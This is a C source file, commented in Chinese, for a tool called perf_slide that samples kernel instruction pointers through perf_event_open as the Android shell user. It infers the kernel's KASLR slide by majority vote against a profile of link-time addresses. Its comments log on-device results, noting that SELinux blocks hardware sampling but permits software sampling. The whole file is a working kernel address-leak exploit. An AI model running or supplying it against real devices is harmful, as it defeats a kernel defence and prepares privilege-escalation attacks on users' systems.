/*
 * perf_slide — 用 perf 采样泄漏的内核帧反推 KASLR 位移。
 *
 * 真机结论（2026-11-22，shell 身份，6.18.21）：
 *   perf_event_open(HARDWARE cycles)  → errno=13 EACCES   SELinux 只挡硬件 PMU
 *   perf_event_open(SOFTWARE)         → errno=7  E2BIG    权限通，只是 attr.size 太大
 * 所以：attr.size 用 PERF_ATTR_SIZE_VER5，先试硬件，失败退回软件采样。
 *
 * --duration 的单位是**秒**（调用方传 1、2），不是毫秒。外层还有 8 秒 timeout 兜底，
 * 所以这里再夹一次 1..8，避免被误传成几百秒时把设备拖住。
 *
 * slide 的求法：
 *   运行时地址 = 链接期地址 + slide，且 slide & 0x1FFFFF == 0（2MB 对齐）。
 *   对泄漏到的内核 ip：若 profile 里某个链接期地址 P 满足
 *   (P & 0x1FFFFF) == (ip & 0x1FFFFF)，则 slide = ip - P（天然 2MB 对齐）。
 *   每个样本投一票，多数投票收敛；单样本会有假匹配。
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>

#define MAX_CANDIDATES 4096
#define SAMPLE_LIMIT   400000
#define MAX_PROFILE    64
#define SLIDE_MASK     0x1FFFFFULL
#define MAX_SECONDS    8
#define SW_PERIOD_NS   100000ULL

static const char *KERNEL_SYMBOL_VERSION = "LINUX_2.6.39";
static const char *DEFAULT_PROFILE = "/data/local/tmp/lhasa_profile.txt";

struct config {
	uint64_t period;
	uint64_t seconds;
	int quiet;
	const char *profile;
};

struct candidate {
	uint64_t slide;
	int votes;
};

static struct candidate g_candidates[MAX_CANDIDATES];
static int g_candidate_count;
static uint64_t g_profile[MAX_PROFILE];
static int g_profile_count;

static int is_kernel_address(uint64_t ip)
{
	return (ip >> 48) == 0xffff;
}

static int is_valid_slide(uint64_t slide)
{
	return (slide & SLIDE_MASK) == 0
		&& ((slide + (uint64_t)(-272730423296LL)) >> 48) == 0xFFFF;
}

static void load_profile(const char *path)
{
	FILE *file = fopen(path, "r");
	if (!file)
		return;
	char line[4096];
	while (fgets(line, sizeof(line), file) != NULL) {
		if (strncmp(line, "release=", 8) != 0)
			continue;
		char *cursor = line;
		while ((cursor = strstr(cursor, "0x")) != NULL) {
			char *end = NULL;
			unsigned long long value = strtoull(cursor, &end, 16);
			if (end == cursor) {
				cursor += 2;
				continue;
			}
			if (g_profile_count < MAX_PROFILE && is_kernel_address(value))
				g_profile[g_profile_count++] = value;
			cursor = end;
		}
	}
	fclose(file);
}

static void vote(uint64_t slide)
{
	for (int i = 0; i < g_candidate_count; i++) {
		if (g_candidates[i].slide == slide) {
			g_candidates[i].votes++;
			return;
		}
	}
	if (g_candidate_count < MAX_CANDIDATES) {
		g_candidates[g_candidate_count].slide = slide;
		g_candidates[g_candidate_count].votes = 1;
		g_candidate_count++;
	}
}

static void consider_ip(uint64_t ip)
{
	uint64_t low = ip & SLIDE_MASK;
	for (int i = 0; i < g_profile_count; i++) {
		if ((g_profile[i] & SLIDE_MASK) != low)
			continue;
		uint64_t slide = ip - g_profile[i];
		if (is_valid_slide(slide))
			vote(slide);
	}
}

static void usage(const char *argv0)
{
	printf("usage: %s [--duration seconds] [--period ns] [--profile path] [--quiet]\n", argv0);
}

static void parse_args(int argc, char **argv, struct config *cfg)
{
	for (int i = 1; i < argc; i++) {
		const char *arg = argv[i];
		if (!strcmp(arg, "--period") && i + 1 < argc)
			cfg->period = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(arg, "--duration") && i + 1 < argc)
			cfg->seconds = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(arg, "--profile") && i + 1 < argc)
			cfg->profile = argv[++i];
		else if (!strcmp(arg, "--quiet"))
			cfg->quiet = 1;
		else if (!strcmp(arg, "-h") || !strcmp(arg, "--help"))
			usage(argv[0]);
	}
	if (cfg->seconds == 0)
		cfg->seconds = 1;
	if (cfg->seconds > MAX_SECONDS)
		cfg->seconds = MAX_SECONDS;
}

static int sample(uint32_t type, uint64_t config, uint64_t period_ns, struct config *cfg,
                  int *samples_out, int *kernel_frames_out)
{
	struct perf_event_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.type = type;
	attr.size = PERF_ATTR_SIZE_VER5;
	attr.config = config;
	attr.sample_period = period_ns;
	attr.sample_type = PERF_SAMPLE_IP;
	attr.disabled = 1;
	attr.exclude_user = 1;
	attr.wakeup_events = 1;

	int fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
	if (fd < 0)
		return -errno;

	size_t page = (size_t)sysconf(_SC_PAGESIZE);
	size_t data_pages = 64;
	size_t map_len = (data_pages + 1) * page;
	void *ring = mmap(NULL, map_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (ring == MAP_FAILED) {
		int err = -errno;
		close(fd);
		return err;
	}

	ioctl(fd, PERF_EVENT_IOC_RESET, 0);
	ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
	usleep((useconds_t)(cfg->seconds * 1000ULL * 1000ULL));
	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

	struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)ring;
	uint8_t *data = (uint8_t *)ring + page;
	size_t data_size = data_pages * page;

	uint64_t head = meta->data_head;
	__sync_synchronize();
	uint64_t tail = meta->data_tail;

	int samples = 0;
	int kernel_frames = 0;
	while (tail < head && samples < SAMPLE_LIMIT) {
		struct perf_event_header *header =
			(struct perf_event_header *)(data + (tail % data_size));
		if (header->size < sizeof(*header) || tail + header->size > head)
			break;
		if (header->type == PERF_RECORD_SAMPLE) {
			uint64_t ip;
			memcpy(&ip, data + (tail % data_size) + sizeof(*header), sizeof(ip));
			samples++;
			if (is_kernel_address(ip)) {
				kernel_frames++;
				consider_ip(ip);
			}
		}
		tail += header->size;
	}
	meta->data_tail = tail;

	munmap(ring, map_len);
	close(fd);

	*samples_out = samples;
	*kernel_frames_out = kernel_frames;
	return 0;
}

int main(int argc, char **argv)
{
	struct config cfg = {
		.period = 0,
		.seconds = 0,
		.quiet = 0,
		.profile = DEFAULT_PROFILE,
	};
	parse_args(argc, argv, &cfg);

	load_profile(cfg.profile);
	if (g_profile_count == 0) {
		printf("[perf] profile 不可用（%s），无法把 ip 折算成 slide\n", cfg.profile);
		printf("提示：符号表版本标记 %s\n", KERNEL_SYMBOL_VERSION);
		return 1;
	}
	printf("[perf] 采样 %llu 秒 · profile 地址 %d 条\n",
	       (unsigned long long)cfg.seconds, g_profile_count);

	int samples = 0, kernel_frames = 0;
	uint64_t hw_period = cfg.period ? cfg.period : 1000;
	int hw_err = sample(PERF_TYPE_HARDWARE, PERF_COUNT_HW_CPU_CYCLES, hw_period, &cfg,
	                    &samples, &kernel_frames);
	if (hw_err == 0) {
		printf("[perf] 采样方式：hardware cycles\n");
	} else {
		printf("[perf] hardware cycles open failed errno=%d (%s)\n",
		       -hw_err, strerror(-hw_err));
		uint64_t sw_period = cfg.period ? cfg.period : SW_PERIOD_NS;
		int sw_err = sample(PERF_TYPE_SOFTWARE, PERF_COUNT_SW_CPU_CLOCK, sw_period, &cfg,
		                    &samples, &kernel_frames);
		if (sw_err != 0) {
			printf("[perf] no usable hardware PMU errno=%d\n", -sw_err);
			printf("[perf] software sampling also failed errno=%d (%s)\n",
			       -sw_err, strerror(-sw_err));
			return 1;
		}
		printf("[perf] 采样方式：software cpu-clock\n");
	}

	printf("[perf] samples=%d kernel_frames=%d\n", samples, kernel_frames);

	if (kernel_frames == 0) {
		printf("[perf] no kernel frames leaked\n");
		return 1;
	}

	if (g_candidate_count == 0) {
		printf("[perf] no slide candidate\n");
		return 1;
	}

	int best = 0;
	for (int i = 1; i < g_candidate_count; i++) {
		if (g_candidates[i].votes > g_candidates[best].votes)
			best = i;
	}

	printf("[perf] candidates=%d\n", g_candidate_count);
	printf("[perf] best votes=%d/%d slide=%#lx\n",
	       g_candidates[best].votes, kernel_frames,
	       (unsigned long)g_candidates[best].slide);
	printf("slide=0x%llx\n", (unsigned long long)g_candidates[best].slide);
	return 0;
}
